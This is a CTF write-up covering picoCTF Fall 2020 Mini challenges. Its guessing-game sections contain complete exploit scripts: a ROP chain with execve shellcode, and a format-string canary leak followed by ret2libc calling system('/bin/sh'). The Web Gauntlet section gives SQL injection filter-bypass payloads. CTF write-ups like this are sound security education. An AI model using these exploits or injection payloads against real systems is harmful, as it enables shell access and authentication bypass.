+++
title = "picoCTF Fall 2020 Mini"
date = 2020-10-31

[taxonomies]
tags = ["ctf-writeups"]
+++

In October 2020 picoCTF put on a month long mini competition to celebrate National Cybersecurity Awareness Month.  I solved all the challenges and made writeups for them all.  

<!-- more -->

# Nothing Up My Sleeve

```text
Let's check that your internet connection is working. This flag is 'in-the-clear', I promise! Download flag.txt
```

Not much to see here -- the flag is in the downloadable flag file.  

flag: picoCTF{c0ngr4ts_0n_y0ur_$@|\|1-|-L|}


# Pitter, Patter, Platters

```text
'Suspicious' is written all over this disk image. Download suspicious.dd.sda1
```
[suspicious.dd.sda1](/picoctf-mini-2020/pitter_patter_platters/suspicious.dd.sda1)


Well, okay, let's mount it. `sudo mount -o loop suspicious.dd.sda1 fs`

```text
❯ cd fs
❯ ls
boot  lost+found  suspicious-file.txt  tce
❯ cat suspicious-file.txt
Nothing to see here! But you may want to look here -->
```

I'm gonna take a wild guess (which happened to be correct) and check the data right after this file.  

```text
❯ strings -td suspicious.dd.sda1 | grep "Nothing to see here"
2098176 Nothing to see here! But you may want to look here -->
❯ dd if=suspicious.dd.sda1 skip=2098176 count=128 iflag=skip_bytes,count_bytes of=slice

0+1 records in
0+1 records out
128 bytes copied, 0.000143797 s, 890 kB/s
❯ xxd slice
00000000: 4e6f 7468 696e 6720 746f 2073 6565 2068  Nothing to see h
00000010: 6572 6521 2042 7574 2079 6f75 206d 6179  ere! But you may
00000020: 2077 616e 7420 746f 206c 6f6f 6b20 6865   want to look he
00000030: 7265 202d 2d3e 0a7d 0038 0033 0034 0036  re -->.}.8.3.4.6
00000040: 0030 0063 0061 0065 005f 0033 003c 005f  .0.c.a.e._.3.<._
00000050: 007c 004c 006d 005f 0031 0031 0031 0074  .|.L.m._.1.1.1.t
00000060: 0035 005f 0033 0062 007b 0046 0054 0043  .5._.3.b.{.F.T.C
00000070: 006f 0063 0069 0070 0000 0000 0000 0000  .o.c.i.p........
```

That sure looks promising.  We can filter out the null bytes and reverse it with a little python.  

```bash
python -c "print(''.join(reversed('}.8.3.4.6.0.c.a.e._.3.<._.|.L.m._.1.1.1.t.5._.3.b.{.F.T.C.o.c.i.p'.split('.'))))" 
```
flag: picoCTF{b3_5t111_mL|_<3_eac06438}


# Web Gauntlet

### round 1

Round 1 filters `or`

```1' union select * from users where username='admin'-- ```

### round 2

Round 2 filters `or and like = --`
to fix this we justneed to change the comment and the way we filter down to only admin.  /* works as a comment and i guessed that admin was the first alphabetically and filtered with a less than.  
```1' union select * from users where username<'bdmin'/* ```

### round 3

Round 3 filters `or and = like > < --`

this one blocks spaces so we gotta replace the spaces with comments


```1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*```

### round 4

Round 4 filters `or and = like > < -- admin`

easy fix, just don't log in to admin explicitly and let the limit 1 take care of us

```1'/*union*/union/*select*/select/*test*/*/*from*/from/*users*/users/*limit*/limit/*1*/1/*```

### round 5

Round 5 filters `or and = like > < -- admin union`

I spent far too long trying to find another way to union without union and then the solution clicked.  I control the username as well so I can just select admin and then comment out the password check.  

```'||'adm'||'in'/*"```


# guessing game 1

```text
I made a simple game to show off my programming skills. See if you can beat it! vuln vuln.c Makefile nc jupiter.challenges.picoctf.org 28951
```

[vuln](/picoctf-mini-2020/guessing_game_1/vuln)


```makefile
all:
	gcc -m64 -fno-stack-protector -O0 -no-pie -static -o vuln vuln.c

clean:
	rm vuln
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n\n");
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

Nothing too crazy in the source code -- we have to "guess" (aka generate an unseeded random number) the number and then we get a buffer overflow.  We don't have any way to read the flag in the source code so we'll need to do something clever.  The Makefile is a little more interesting -- the binary is statically compiled which means we can't do my first thought (ret2libc).  

I looked around the binary and did some research and eventually found the function `_dl_make_stack_executable` which does exactly what it sounds like.  It is a fairly simple function

```text
[0x00400a40]> pdf@sym._dl_make_stack_executable
┌ 82: sym._dl_make_stack_executable (int64_t arg1);
│           ; arg int64_t arg1 @ rdi
│           0x00480860      488b3591a923.  mov rsi, qword [obj._dl_pagesize] ; [0x6bb1f8:8]=0x1000
│           0x00480867      53             push rbx
│           0x00480868      4889fb         mov rbx, rdi                ; arg1
│           0x0048086b      488b17         mov rdx, qword [rdi]        ; arg1
│           0x0048086e      4889f7         mov rdi, rsi
│           0x00480871      48f7df         neg rdi
│           0x00480874      4821d7         and rdi, rdx
│           0x00480877      483b15329223.  cmp rdx, qword [obj.__libc_stack_end] ; [0x6b9ab0:8]=0
│       ┌─< 0x0048087e      7520           jne 0x4808a0
│       │   0x00480880      8b156a962300   mov edx, dword [obj.__stack_prot] ; [0x6b9ef0:4]=0x1000000
│       │   0x00480886      e8f5abfcff     call sym.__mprotect
│       │   0x0048088b      85c0           test eax, eax
│      ┌──< 0x0048088d      7521           jne 0x4808b0
│      ││   0x0048088f      48c703000000.  mov qword [rbx], 0
│      ││   0x00480896      830d4ba92300.  or dword [obj._dl_stack_flags], 1 ; [0x6bb1e8:4]=7
│      ││   0x0048089d      5b             pop rbx
│      ││   0x0048089e      c3             ret
..
│      ││   ; CODE XREF from sym._dl_make_stack_executable @ 0x48087e
│      │└─> 0x004808a0      b801000000     mov eax, 1
│      │    0x004808a5      5b             pop rbx
│      │    0x004808a6      c3             ret
..
│      │    ; CODE XREF from sym._dl_make_stack_executable @ 0x48088d
│      └──> 0x004808b0      48c7c0c0ffff.  mov rax, 0xffffffffffffffc0
│           0x004808b7      5b             pop rbx
│           0x004808b8      648b00         mov eax, dword fs:[rax]
└           0x004808bb      c3             ret
```
So: `_dl_make_stack_executable` takes a single argument, wraps `mprotect` and changes the memory protection to `__stack_prot`.  `__stack_prot` happens to be writable so we can change that to 7 (PROT_READ|PROT_EXEC|PROT_WRITE) and then call `_dl_make_stack_executable` with an argument of `__libc_stack_end`.  After that it's essentially over - we can put our shellcode on the stack and then ROP to it.  

```python
from pwn import *
from ctypes import *
import re
import time
libc = CDLL("libc.so.6")
# http://shell-storm.org/shellcode/files/shellcode-603.php
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

context.terminal = ['termite', '-e']

def get_next():
	return (libc.rand() % 100) + 1

elf = ELF("./vuln")
rop = ROP(elf)

mov_rdx_rax = 0x0000000000419127 # pwntools couldn't find this idk why
pop_rdx = (rop.find_gadget(['pop rdx', 'ret']))[0]
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0]
pop_rax = (rop.find_gadget(['pop rax', 'ret']))[0]
push_rsp = 0x0000000000451974 # pwntools couldn't find this idk why

p = remote("jupiter.challenges.picoctf.org", 28951)
p.sendline(str(get_next())) # first randomly generated number + 1


payload = B"A" * 120
payload += p64(pop_rdx) + p64(elf.symbols['__stack_prot'])
payload += p64(pop_rax) + p64(7)
payload += p64(mov_rdx_rax)
payload += p64(pop_rdi) + p64(elf.symbols['__libc_stack_end'])
payload += p64(elf.symbols['_dl_make_stack_executable'])
payload += p64(push_rsp) + shellcode

p.sendline(payload)
time.sleep(.5)
p.recvuntil("Name?")
p.recvline()
p.sendline("cat flag.txt;exit;")
print(re.search("(picoCTF{.*?})",p.recvall().decode()).group(1))
```


# guessing game 2

[vuln](/picoctf-mini-2020/guessing_game_2/vuln)

```makefile
all:
	gcc -m32 -no-pie -Wl,-z,relro,-z,now -o vuln vuln.c
debug:
	gcc -m32 -no-pie -Wl,-z,relro,-z,now -g -o vuln_debug vuln.c
clean:
	rm vuln
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 512


long get_random() {
	return rand;
}

int get_version() {
	return 2;
}

int do_stuff() {
	long ans = (get_random() % 4096) + 1;
	int res = 0;
	
	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);
	
	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}

void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	gets(winner);
	printf("Congrats: ");
	printf(winner);
	printf("\n\n");
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	
	int res;
	
	printf("Welcome to my guessing game!\n");
	printf("Version: %x\n\n", get_version());
	
	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}
	
	return 0;
}
```

This version of guessing_game is pretty similar to the previous.  It isn't static this time, and get_random() returns the address of rand instead of an actual random number, but other than that the binary is pretty similar.  Since it isn't static we can't do the same attack as last time, but the dynamic linking opens up other avenues of attack.  Also, the vulnerable function now has a string formatting vulnerability as well.  In this case we'll be performing a [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) attack to get a shell.  


First step is to figure out what number we need to guess to get into the vulnerability function.  I wrote a python script to try everything and figure it out for me.  

```python
from pwn import *
from ctypes import *
import re
import json
import sys

tasks = 4096

checked = {}
def check(i):
	if str(i) in checked:
		return checked[str(i)]
	p = remote("jupiter.challenges.picoctf.org", 28953)
	p.recvline()
	p.recvline()
	p.recvline()
	p.sendline("-" + str(i))
	resp = p.recvline().decode()
	p.close()
	checked[i] = (i, re.search("Congrats!", resp ) != None)
	return (i, re.search("Congrats!", resp ) != None)

try:
	for i in range(tasks):
		if i % 32 == 0:
			print("trying num = ", i)
		c = check(i)
		if c[1] == True:
			print("found!", c)
			open("checked.json","w").write(json.dumps(checked))
			sys.exit()
except (KeyboardInterrupt, SystemExit):
	open("checked.json","w").write(json.dumps(checked))
open("checked.json","w").write(json.dumps(checked))
```

I leaked the canary with the string formatting vuln.  The stack is constant sized so I just searched for the canary in GDB and then counted the distance I needed to read with the string formatting attack.  The canary is constant between program executions so once I have the canary I can just ROP back into the vulnerable function and then do my ret2libc exploit.  

In theory you could leak the libc version based on the location of a symbol using something like [libc database search](https://libc.blukat.me/) but you could also just guess and be lucky.  Libc 2.27 is the version of libc used on Ubuntu 18.04 and thus very frequently the libc version used on CTF servers.  Once you know the offset of some function in libc you can subtract the offset of that function (I used rand) in the libc version on the server to get the address of the base of the libc.  Once you have the base of libc you can determine the address of any function inside libc by adding the offset of that function to your calculate base.  Once you can do this there is nothing stopping you from calling system("/bin/sh") and getting a shell.  

```python
from pwn import *
import re
context.terminal = ["termite","-e"]

elf = ELF("./vuln")

# p = elf.debug()
# p = elf.process()
p = remote("jupiter.challenges.picoctf.org", 15815)
p.recvuntil("guess?")

NUMBER = "-31"


WIN_EIP_OFFSET = 720

WIN_CANARY_OFFSET = 320



def leak_canary():
	p.sendline(NUMBER)

	p.recvuntil("Name?")
	p.sendline("%135$x")
	resp = p.recvline().decode()
	p.recvuntil("guess?")
	return int(re.search("Congrats: ([0-9a-fA-F]{8})", resp).group(1),16)

canary = leak_canary()
def send_rop(rop):
	p.recvuntil("Name?")
	payload = b"A" * 512 + p32(canary) + b"A" * 12 + rop
	p.sendline(payload)

def leak_symbol(sym):
	rop = ROP(elf)
	rop.puts(elf.symbols[sym])
	rop.win()
	send_rop(rop.chain())
	p.recvline()
	p.recvline()
	res = p.recvline()
	p.recvline()
	return u32(res[0:4])
p.sendline(NUMBER)
rand_sym = leak_symbol('rand')


# libc 2.32
# RAND_OFFSET = 0x39170
# SYSTEM_OFFSET = 0x456e0
# STR_BIN_SH_OFFSET = 0x195108
#libc 2.27
RAND_OFFSET = 0x30fe0
SYSTEM_OFFSET = 0x3cd80
STR_BIN_SH_OFFSET = 0x17bb8f
libc_base = rand_sym - RAND_OFFSET
system = libc_base + SYSTEM_OFFSET
binsh = libc_base + STR_BIN_SH_OFFSET
print("rand:", hex(rand_sym))
rop = ROP(elf)
rop.call(system, [binsh])
send_rop(rop.chain())

p.sendline("cat flag.txt;exit;")
print(re.search("(picoCTF{.*?})",p.recvall().decode()).group(1))
```

flag: 
```text
picoCTF{p0p_r0p_4nd_dr0p_1t_506b81e98597929e}
```
# OTP Implementation


```text
Yay reversing! Relevant files: otp flag.txt
```

[otp](/picoctf-mini-2020/otp/otp)


![main function](/picoctf-mini-2020/otp/main1.png)
![valid_char function, returns true if it is a valid char in a hex string](/picoctf-mini-2020/otp/valid_char.png)

So to summarize:
1. It copies 100 chars from the first argument
2. It does gross stuff that I don't care to reverse
3. If a char isn't a valid hex string it'll fail. 
4. If it doesn't process 100 characters it'll fail.  

In an attempt to avoid manually reversing the code I took a look at it using ltrace.  
```text
❯ ltrace ./otp aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
strncpy(0x7ffc8cd5be70, "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 100)                                                                                  = 0x7ffc8cd5be70
strncmp("fkpejodinchmbglafkpejodinchmbgla"..., "mlaebfkoibhoijfidblechbggcgldice"..., 100)                                                           = -7
puts("Invalid key!"Invalid key!
)                                                                                                                                 = 13
+++ exited (status 1) +++
❯ ltrace ./otp baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
strncpy(0x7ffc13641a60, "baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 100)                                                                                  = 0x7ffc13641a60
strncmp("hmbglafkpejodinchmbglafkpejodinc"..., "mlaebfkoibhoijfidblechbggcgldice"..., 100)                                                           = -5
puts("Invalid key!"Invalid key!
)                                                                                                                                 = 13
+++ exited (status 1) +++
❯ ltrace ./otp abaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
strncpy(0x7ffe053233b0, "abaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"..., 100)                                                                                  = 0x7ffe053233b0
strncmp("fmbglafkpejodinchmbglafkpejodinc"..., "mlaebfkoibhoijfidblechbggcgldice"..., 100)                                                           = -7
puts("Invalid key!"Invalid key!
)                                                                                                                                 = 13
+++ exited (status 1) +++
```

The key thing to note here is that a character affects itself and any character after it.  This means that we can brute force the correct code in linear time by trying a character until we know its correct and then moving on to the next one.  This is implemented using python below.  

```python
from subprocess import Popen, PIPE, STDOUT
import re
from binascii import unhexlify
flag = "1fcb81cd1f6f1e12b429092e3647153b6c212772554ca004145b82367e1e6b7870827dc249a319601776f727434e6b6227d1"
target = "mlaebfkoibhoijfidblechbggcgldicegjbkcmolhdjihgmmieabohpdhjnciacbjjcnpcfaopigkpdfnoaknjlnlaohboimombk"

key = list("0" * 100)

strncmp_regex = re.compile("strncmp\(\"(.*?)\".*\)")

def xors(a,b):
	return "".join([chr(x ^ y) for x,y in zip(a,b)])

for i in range(100):
	for j in "0123456789abcdef":
		key[i] = j
		p = Popen(["ltrace", "-s", "1000", "./otp" , ''.join(key)], stdout=PIPE, stderr=STDOUT)
		response = p.communicate()[0].decode()
		match = strncmp_regex.search(response).group(1)[0:100]
		if match[i] == target[i]:
			print(match)
			break
		# print()
print("key:", ''.join(key))
print("flag:", xors(unhexlify(''.join(key)),unhexlify(flag)))
```
flag: 
```text
picoCTF{cust0m_jumbl3s_4r3nt_4_g0Od_1d3A_ca692500}
```
